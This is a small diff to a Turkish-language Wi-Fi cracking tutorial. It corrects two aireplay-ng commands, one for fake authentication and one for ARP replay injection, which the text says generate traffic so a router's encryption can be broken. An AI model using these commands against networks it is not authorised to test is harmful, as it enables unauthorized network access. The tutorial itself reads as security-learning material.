@@ -79,7 +79,7 @@ Ağda yeterli trafik yoksa kendin oluşturabilirsin. İşte adımlar:
 
 ### 🔐 1. Sahte Bağlantı Kurma
 ```bash
-aireplay-ng --fakeauth 0 -a (BSSID) -h (Wi-Fi kart MAC)
+aireplay-ng --fakeauth 0 -a (BSSID) -h (Wi-Fi kart MAC) (interface)
 ```
 - 📡 Modeme sahte bir şekilde bağlanır.
 - MAC adresini öğrenmek için:
@@ -89,7 +89,7 @@ aireplay-ng --fakeauth 0 -a (BSSID) -h (Wi-Fi kart MAC)
 
 ### 🔁 2. ARP Replay ile Trafik Oluşturma
 ```bash
-aireplay-ng --arpreplay -b (BSSID) -h (Wi-Fi kart MAC)
+aireplay-ng --arpreplay -b (BSSID) -h (Wi-Fi kart MAC) (interface)
 ```
 - 💣 Modemde **sahte veri trafiği** oluşturur.
 - Bu sayede şifreleme kırılabilir hale gelir.
